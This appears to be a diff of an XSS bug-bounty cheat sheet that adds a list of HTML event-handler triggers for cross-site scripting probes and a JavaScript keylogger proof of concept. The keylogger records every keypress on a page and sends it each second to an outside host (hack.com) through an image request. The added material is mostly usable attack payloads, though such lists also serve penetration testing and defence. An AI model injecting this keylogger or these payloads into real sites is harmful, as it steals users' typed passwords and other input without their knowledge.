@@ -73,8 +73,6 @@ Self
 			can force victim to log back in using OAuth
 			credentials
 
-			
-
 
 
 App-specific impact demonstration payloads
@@ -131,6 +129,44 @@ XSS Dorks (top 25 per OpenBugBounty)
 	?enddate=
 
 
+Top Triggers
+	onload=alert()
+	onerror=confirm()
+	onfocus=prompt()
+	onclick=alert()
+	onmouseover=confirm()
+	onchange=prompt()
+	onmouseup=alert()
+	onkeydown=confirm()
+	onkeyup=prompt()
+	onkeypress=alert()
+	onMoveOn=confirm()
+	onabort=prompt()
+	ondblclick=alert()
+	onresize=confirm()
+	onselect=prompt()
+	onscroll=alert()
+	onsubmit=confirm()
+	onblur=prompt()
+	onreset=alert()
+	onunload=confirm()
+
+
+
+
+
+XSS Keylogger PoC (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)
+	var keys='';
+	document.onkeypress = function(e) {
+	  get = window.event?event:e;
+	  key = get.keyCode?get.keyCode:get.charCode;
+	  key = String.fromCharCode(key);
+	  keys+=key;
+	}
+	window.setInterval(function(){
+	  new Image().src = 'http://hack.com/keylogger.php?c='+keys;
+	  keys = '';
+	}, 1000);
 
 
 
